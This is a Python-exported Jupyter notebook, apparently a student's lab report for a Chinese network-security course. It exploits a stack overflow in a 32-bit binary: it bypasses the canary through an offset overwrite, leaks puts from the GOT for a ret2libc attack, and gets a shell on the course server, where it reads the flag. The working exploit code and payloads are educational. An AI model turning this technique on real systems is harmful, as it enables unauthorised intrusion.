#!/usr/bin/env python
# coding: utf-8

# # 网络安全工程与实践 第四次实验
# 计63 陈晟祺 2016010981
# 
# 本次实验的内容是 32 位二进制文件的栈溢出漏洞利用。实验报告分为三个版本：
# 
# - `exp.py`: 可用 iPython2 执行的利用脚本
# - `exp.ipynb`: 可用 Jupyter Notebook 执行的利用脚本和报告
# - `exp.html`: 可用浏览器打开的实验报告（嵌入脚本和结果）
# 
# ## 本地分析
# 
# 我们先使用 pwntools 打开二进制文件

# In[1]:


get_ipython().run_line_magic('env', 'PWNLIB_NOTERM=true')
from pwn import *

context.endian = 'little'
context.arch = 'i686'

name = './vul32'
binary = ELF(name)


# 可以看到有 Stack Canary 和 NX，但是没有 PIE。  
# 挂上 gdb 先 fuzz 一下。输入一个很长的字符串，观察到在 `dovuln()` 中崩溃。  
# 使用 IDA 反编译该函数，得到以下代码（经过变量重命名）：
# ```C
# int dovuln()
# {
#   int i; // eax
#   char c; // [esp+4h] [ebp-44h]
#   char buf[51]; // [esp+5h] [ebp-43h]
#   int offset; // [esp+38h] [ebp-10h]
#   unsigned int stack_canary; // [esp+3Ch] [ebp-Ch]
# 
#   stack_canary = __readgsdword(0x14u);
#   memset(buf, 0, 0x30u);
#   offset = 0;
#   while ( 1 )
#   {
#     if ( read(0, &c, 1u) != 1 )
#       exit(0);
#     if ( c == 10 )
#       break;
#     i = offset++;
#     buf[i] = c;
#   }
#   return puts(buf);
# }
# ```
# 我们可以知道函数的栈布局为：
# ```
# Return Address (EBP + 4)
# Saved EBP (EBP)
# ...
# Stack Canary (EBP - 12)
# int offset (EBP - 16)
# char buf[51] (EBP - 67)
# char c (EBP - 68)
# ```
# 所以根据上述的代码逻辑，可以通过溢出修改 `offset` 来绕过 Stack Canary 的检查。具体来说，只需要改变 `buf` 的第 52 个字节，也就是 `offset` 的 LSB。将其改为 4+67=71，就能直接在接下来的写中更改函数的返回地址，以及栈更高处的内容。 
#   
# 先使用跳回 main 的方法在本地测试该方法的可行性：

# In[2]:


main = binary.symbols['main']
payload = 'A' * 51 + chr(71) + p32(main)
p = process(name)
print(p.recv())
p.send(payload)
p.send('\n')
print(p.recv())
p.kill()


# 可以看到上述思路是可行的。
# 
# ## 远程利用
# 
# 为了获得 shell，我们需要调用 libc 中的 `system` 函数并传入 `/bin/sh`。但是文件中并没有导入该符号，因此需要设法找到这个地址。考虑到 libc 的各个函数偏移量都是一定的，我们只需要获得任意一个函数的地址即可。观察到 `dovuln()` 中调用了 `puts`，我们可以从这个函数入手。由动态导入机制可知，其实际地址保存在 GOT 表中：

# In[3]:


puts_address_ptr = binary.got['puts']


# 只需要设法泄露出这个地址的值就可以了。巧合的是，我们可以把这个地址传给 `puts()` 函数来达成这一目标。考虑 32 位 cdecl 调用约定，我们需要将栈布局为：
# ```
# puts_address_ptr (EBP + 12)
# Return Address of puts (EBP + 8)
# Address of puts (EBP + 4)
# Saved EBP (EBP)
# ...
# ```
# 这样在函数返回后，`puts` 就会输出我们所需的地址。如果我们将其返回地址指向 `main` 的地址，则接下来还可进行第二次利用。

# In[4]:


p = remote('202.112.51.154',20001)
payload = 'A' * 51 + chr(71) + p32(binary.symbols['puts']) + p32(main) + p32(puts_address_ptr)
print(p.recv())
p.sendline(payload)
print(p.recv())
leaked_info = p.recv()
print(leaked_info)
p.close()


# 可以看到我们成功调用了 `puts` 函数并泄露了地址如下：

# In[5]:


puts_address = u32(bytes(leaked_info.splitlines()[1][0:4]))
print(hex(puts_address))


# 下面我们计算 libc 中各个符号的偏移量：

# In[6]:


libc = ELF('./libc.so.6')
puts_libc = libc.symbols['puts']
system_offset = libc.symbols['system'] - puts_libc
sh_str_offset = next(libc.search('/bin/sh\x00')) - puts_libc
print(hex(puts_libc))


# 可以看到泄露的 `memset` 地址与 libc 中是对应的。  
# 接下来就在可以远程运行 shell 命令。考虑到 ASLR 的影响，libc 的地址每次加载可能都会变化，所以地址泄露和函数调用需要在同一个进程中完成。  
# 由于 Jupyter Notebook 不能进行交互，我们使用函数每次运行一条命令：

# In[7]:


p = remote('202.112.51.154', 20001)
p.recv()

# leak memset address
payload = 'A' * 51 + chr(71) + p32(binary.symbols['puts']) + p32(main) + p32(puts_address_ptr)
p.sendline(payload)
p.recv()
leaked_info = p.recv()
memset_address = u32(bytes(leaked_info.splitlines()[1][0:4]))

# calculate function address
system_address = memset_address + system_offset
sh_str_address = memset_address + sh_str_offset

# getshell!
payload = 'A' * 51 + chr(71) + p32(system_address) + p32(main) + p32(sh_str_address)
p.sendline(payload)
p.recv()

def remote_exec(cmd):
    p.sendline(cmd)
    print(p.recvlines(timeout=0.5))


# 下面就可以在远程服务器上执行命令：

# In[8]:


remote_exec('whoami')


# In[9]:


remote_exec('ls /home/ctf_puck/')


# In[10]:


remote_exec('cat /home/ctf_puck/flag')


# 最终得到 flag 为 `flag{Ok_yOu_get@#$_it!}`

# In[11]:


p.close()


# ## 总结
# 
# 本次实验是一个比较复杂的栈溢出攻击，需要绕过 NX、Stack Canary 以及 ASLR 等多种保护机制。事实上可利用的机制不是唯一的，如其他被导入到程序中的符号也可用来进行 libc 地址泄露。如果在 x86_64 架构上，我们就无法简单地通过操纵栈内容进行函数传参与调用，而需要 ROP 等更复杂的手段。值得一提的是， pwntools 可以自动化发现和构建 ROP 链，非常方便。
